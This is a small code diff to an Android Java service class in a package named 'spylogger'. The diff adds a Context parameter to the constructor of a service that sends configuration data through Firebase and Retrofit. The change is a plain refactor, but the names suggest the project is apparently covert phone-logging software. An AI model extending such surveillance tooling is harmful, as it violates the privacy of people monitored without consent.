@@ -1,5 +1,7 @@
 package com.gravatasufoca.spylogger.services;
 
+import android.content.Context;
+
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
@@ -12,8 +14,8 @@ import retrofit2.Call;
 
 public class SendConfiguracaoService extends SendDataService<Boolean> {
 
-    public SendConfiguracaoService(TaskComplete handler) {
-        super(handler);
+    public SendConfiguracaoService(Context context,TaskComplete handler) {
+        super(context,handler);
     }
 
     public void enviar(ConfiguracaoVO configuracaoVO){
